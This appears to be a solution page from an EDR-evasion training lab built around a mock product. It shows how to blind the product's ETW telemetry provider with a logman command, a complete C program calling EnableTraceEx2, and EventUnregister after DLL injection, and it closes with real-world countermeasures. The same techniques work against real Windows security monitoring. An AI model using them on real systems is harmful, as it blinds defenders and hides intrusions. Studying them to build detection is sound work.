---
layout: default
title: "Solution 27: Provider Unregistration"
---

# Solution 27: Provider Unregistration

## The Bypass

Disable the MostShittyEDR's ETW provider from the trace session using ETW controller APIs. The session continues to run (passing Rule 8's health check), but the provider no longer emits events.

### Method 1: logman (simplest)

```powershell
# Disable the provider by setting keywords and level to 0
logman update trace "MostShittyEDR-Telemetry" ^
    -p "{4D6F7374-5368-6974-7479-454452000000}" 0 0 --ets
```

This tells the session to stop collecting events from the provider by setting the keyword mask and level to 0.

### Method 2: EnableTraceEx2 (programmatic)

```c
#include <windows.h>
#include <evntrace.h>
#include <stdio.h>

// MostShittyEDR provider GUID
static const GUID ProviderGuid = {
    0x4D6F7374, 0x5368, 0x6974,
    { 0x74, 0x79, 0x45, 0x44, 0x52, 0x00, 0x00, 0x00 }
};

int main() {
    // Open the existing trace session
    ULONG bufSize = sizeof(EVENT_TRACE_PROPERTIES) + 1024;
    EVENT_TRACE_PROPERTIES* props = 
        (EVENT_TRACE_PROPERTIES*)calloc(1, bufSize);
    
    props->Wnode.BufferSize = bufSize;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    
    TRACEHANDLE session = 0;
    
    // Query to get the session handle
    ULONG status = ControlTraceW(
        0, L"MostShittyEDR-Telemetry", 
        props, EVENT_TRACE_CONTROL_QUERY);
    
    if (status != ERROR_SUCCESS) {
        printf("[-] Session query failed: %lu\n", status);
        free(props);
        return 1;
    }
    
    session = props->Wnode.HistoricalContext;
    
    // Disable the provider (control code 0)
    status = EnableTraceEx2(
        session,
        &ProviderGuid,
        EVENT_CONTROL_CODE_DISABLE_PROVIDER,  // 0
        0,                                     // level
        0,                                     // keywords
        0,                                     // match all
        0,                                     // timeout
        NULL                                   // parameters
    );
    
    if (status == ERROR_SUCCESS)
        printf("[+] Provider disabled — session still running\n");
    else
        printf("[-] DisableProvider failed: %lu\n", status);
    
    free(props);
    return 0;
}
```

### Method 3: Unregister from within the process

If you have code execution in the EDR process (e.g., via DLL injection):

```c
// The REGHANDLE is stored in a global variable
// Find it via pattern scanning or symbol resolution
extern REGHANDLE gEtwRegHandle;  // or scan for it

EventUnregister(gEtwRegHandle);
```

## Why It Works

Rule 8 checks:
1. **EtwEventWrite bytes** → Unchanged (no patch needed)
2. **Session existence** → Still running (we only disabled the provider)
3. **Provider registration** → **NOT CHECKED** — this is the gap

The provider is disabled at the session controller level. The agent's `EventWrite` calls still execute, but the session ignores them because the provider is no longer enabled in it.

## Real-World Countermeasures

- EDRs should periodically verify their provider is still enabled (via `EnumerateTraceGuids`)
- Kernel-mode ETW-TI providers can't be disabled by user-mode controllers
- Session auto-restart with provider re-enablement
- Monitoring for `EnableTraceEx2` calls targeting EDR providers

## Verification

```powershell
# Session still exists:
logman query "MostShittyEDR-Telemetry" -ets
# Output shows the session with 0 enabled providers

# Rule 8 status: NO ALERT (session check passes)
# But telemetry events: NONE
```
